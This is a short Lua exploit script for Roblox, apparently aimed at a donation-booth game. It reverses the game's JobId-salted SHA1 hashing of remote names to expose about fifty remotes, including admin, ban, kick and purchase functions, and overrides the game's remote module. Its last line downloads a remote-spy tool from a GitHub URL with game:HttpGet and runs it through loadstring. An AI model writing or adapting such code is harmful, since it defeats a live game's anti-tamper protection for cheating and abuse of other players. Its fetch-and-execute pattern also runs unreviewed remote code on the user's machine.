-- Bypass Remotes
local replicatedStorage = game:GetService("ReplicatedStorage")
local remotes = replicatedStorage.Remotes
local remotesModule = require(remotes)
local remotesTable = {"Ban", "Unban", "Kick", "JoinUserServer", "DonatedChanged", "PreloadItems", "InvokeLoginRewards", "VR", "SetDonatedVisibility", "SetSettings", "GiftReceived", "RedeemCode", "ChangeMusic", "EditBoothModel", "NewPurchasedBooths", "UnclaimBooth", "LoginRewards", "GiftSentAlert", "PurchaseBoothStarted", "InsufficientGiftbux", "AlreadyOwned", "ChatDonationAlert", "PlayDonationSound", "GlobalDonationsDown", "AdminCommandResponse", "NotifyDonationParticipants", "NewGiftbuxBalance", "AmIAdmin", "GetAdminLogs", "CheckIfBanned", "CheckUserInGame", "GetDonated", "ClaimBooth", "GetWorldCupVote", "GiveMeLaunchDataPweez", "GetSettings", "UnclaimedDonations", "UnclaimedDonationCount", "RefreshItems", "GetOurTopDonated", "CheckFiltered", "UserInfo", "CurrentBooth", "PurchasedBooths", "ExclusiveBooths", "GiftbuxBalance", "OfflinePlayerLookup", "SetBoothText", "EditWheel", "FetchCreateLink", "CancelPromptPurchase"}
local hashlib = require(replicatedStorage.Packages._Index["boatbomber_hashlib@1.0.0"].hashlib)

local function hash(str)
    return hashlib.bin_to_base64(hashlib.hex_to_bin(hashlib.sha1(str .. game.JobId)))
end

-- Detouring so the remotes dont break
remotesModule.Event = function(remote)
    return remotes:FindFirstChild(remote)
end

remotesModule.Function = function(remote)
    return remotes:FindFirstChild(remote) 
end

for _, remote in next, remotesTable do
    local hashedName = hash(remote)
    local hashedRemote = remotes:FindFirstChild(hashedName)
    
    if hashedRemote then
        hashedRemote.Name = remote
    end
end
local settings = {
   saveCalls = false,
   maxCallsSaved = 1000,
   saveOnlyLastCall = true,
   maxTableDepth = 100,
   minimizeBind = Enum.KeyCode.RightAlt,
   blacklistedNames = {}
}
loadstring(game:HttpGet("https://raw.githubusercontent.com/joeengo/engospy/main/source.lua"))(settings)
